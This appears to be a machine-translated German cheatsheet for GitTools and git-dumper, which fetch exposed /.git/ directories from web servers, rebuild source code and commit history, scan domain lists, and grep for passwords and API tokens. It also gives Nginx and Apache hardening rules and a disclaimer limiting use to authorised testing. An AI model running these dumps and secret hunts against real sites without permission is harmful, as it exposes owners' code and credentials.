<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📂 GitTools – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ███╗██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║   ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚██████╔╝██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
      Exposed /.git/ Repository Dumping, Extraction & Secret Hunting
```
<p align="center">
  <img src="https://img.shields.io/badge/GitTools-Git_Dumping-blue?style=for-the-badge" alt="GitTools">
  <img src="https://img.shields.io/badge/Author-Internetwache-orange?style=for-the-badge" alt="internetwache">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_Secrets-green?style=for-the-badge" alt="Web-Sicherheit">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="center">
  <b>📂 Unverzichtbares Toolkit zum Erkennen exponierter <code>/.git/</code>-Ordner auf Webservern, zum Herunterladen roher Git-Objektspeicher und zur vollständigen Rekonstruktion des ursprünglichen Quellcodes und des Commit-Verlaufs</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Überblick und die exponierte .git-Gefahr](#-overview--the-exposed-git-hazard)
- [Installation](#-Installation)
- [Die drei GitTools-Module](#-the-drei-gittools-modules)
  - [1. Dumper (`gitdumper.sh`)](#1-dumper-gitdumpersh)
  - [2. Extraktor (`extractor.sh`)](#2-extractor-extractorsh)
  - [3. Finder (`finder.py`)](#3-finder-finderpy)
- [Alternativer Python-Dumper: `git-dumper`](#-alternative-python-dumper-git-dumper)
- [Post-Reconstruction Secret & Credential Hunting](#-post-reconstruction-secret--credential-hunting)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Defensive Überlegungen und Webserver-Härtung](#-defensive-considerations--web-server-hardening)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und die exponierte .git-Gefahr

Wenn Entwickler Webanwendungen über `git clone` oder automatisierte Skripte bereitstellen, ohne den Zugriff auf versteckte Verzeichnisse ordnungsgemäß einzuschränken, wird der Ordner **`/.git/`** über HTTP/HTTPS zugänglich:
`https://target.com/.git/`

Selbst wenn die Verzeichnisauflistung (Indizierung) deaktiviert ist, ermöglicht die deterministische Struktur von Git einem Angreifer, `/.git/HEAD`, `/.git/config`, `/.git/index` herunterzuladen und alle Git-losen Objekte (`.git/objects/xx/xxxx...`) zu durchqueren. Dies ermöglicht eine vollständige Rekonstruktion von:
- Vollständiger Anwendungsquellcode und interne APIs.
– Datenbankanmeldeinformationen, API-Tokens und private SSH-Schlüssel in Konfigurationsdateien.
- Vollständige Git-Commit-Protokolle, Autoren-E-Mails und Entwicklungszweige.

---

## 📥 Installation
```bash
# Clone GitTools repository
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Install alternative standalone Python git-dumper via pip
pip install git-dumper
```
---

## 🚀 Die drei GitTools-Module

GitTools ist in drei spezialisierte Dienstprogramme unterteilt:

### 1. Kipper (`gitdumper.sh`)
Lädt so viel wie möglich vom `.git`-Verzeichnis vom Webserver herunter:
```bash
# Syntax: ./gitdumper.sh <URL_TO_GIT> <LOCAL_DESTINATION>
./Dumper/gitdumper.sh https://target.com/.git/ /tmp/target_repo/
```
### 2. Extraktor (`extractor.sh`)
Rekonstruiert Originaldateien, Commit-Bäume und Zweige aus den abgelegten losen `.git`-Objekten:
```bash
# Syntax: ./extractor.sh <DUMPED_DIR> <OUTPUT_CODE_DIR>
./Extractor/extractor.sh /tmp/target_repo/ /tmp/extracted_source/
```
Innerhalb von `/tmp/extracted_source/` wird jedes Commit in einem isolierten Verzeichnis wiederhergestellt, das den vollständigen Dateibaum zu diesem Zeitpunkt enthält.

### 3. Finder (`finder.py`)
Durchsucht Listen von Domänen oder CIDR-Blöcken, um exponierte `.git`-Verzeichnisse zu erkennen:
```bash
python3 Finder/finder.py -i targets.txt -u "Mozilla/5.0"
```
---

## 🐍 Alternativer Python-Dumper: `git-dumper`

`git-dumper` ist eine Multithread-Python-Alternative, die ein aktives, aktives Git-Repository automatisch in einem Schritt rekonstruiert:
```bash
# Dump and reconstruct working repository in one command
git-dumper https://target.com/.git/ ./recovered_repo/

# Run through HTTP/SOCKS proxy
git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./recovered_repo/
```
Sobald Sie fertig sind, können Sie normale `git`-Befehle im Ordner verwenden:
```bash
cd ./recovered_repo/
git log -p              # Review all commit diffs and historical edits
git status              # Check untracked files
git branch -a           # List all remote and local branches
```
---

## 🔍 Jagd nach Geheimnissen und Ausweisen nach dem Wiederaufbau

Sobald das Repository wiederhergestellt ist, suchen Sie nach Anmeldeinformationen und versteckten Dateien:
```bash
cd ./recovered_repo/

# Search for database strings and API keys
grep -Erio "password|secret|api_key|token|AWS" .

# Scan the reconstructed repo with Gitleaks / TruffleHog
gitleaks detect -v
trufflehog git file://$(pwd)
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **Dump mit Git-Dumper (Python)**| `git-dumper https://target.com/.git/ ./repo/` |
| **Dump mit GitTools Bash** | `./Dumper/gitdumper.sh https://target.com/.git/ ./dump/` |
| **Commits zur Quelle extrahieren** | `./Extractor/extractor.sh ./dump/ ./source/` |
| **Hostliste nach .git durchsuchen** | `python3 Finder/finder.py -i domains.txt` |
| **Commit-Verlauf anzeigen** | `git log -p --color` |
| **Jage fest codierte Geheimnisse** | `gitleaks detect -v` |

---

## 🛡️ Verteidigungsüberlegungen und Webserver-Härtung

1. **Nginx-Härtung:**
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
2. **Apache-Härtung (`.htaccess`):**
   ```apache
   RedirectMatch 404 /\.git
   ```
3. **CI/CD Best Practices:** Stellen Sie niemals Code bereit, indem Sie Git direkt in das Web-Root (`/var/www/html/`) klonen. Verwenden Sie saubere Artefaktbündel oder Docker-Container.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> GitTools und Git-Dumper sind für autorisierte Schwachstellenbewertungen und defensive Infrastrukturprüfungen konzipiert. Das Herunterladen von proprietärem Quellcode von nicht autorisierten Webanwendungen ohne Erlaubnis ist illegal.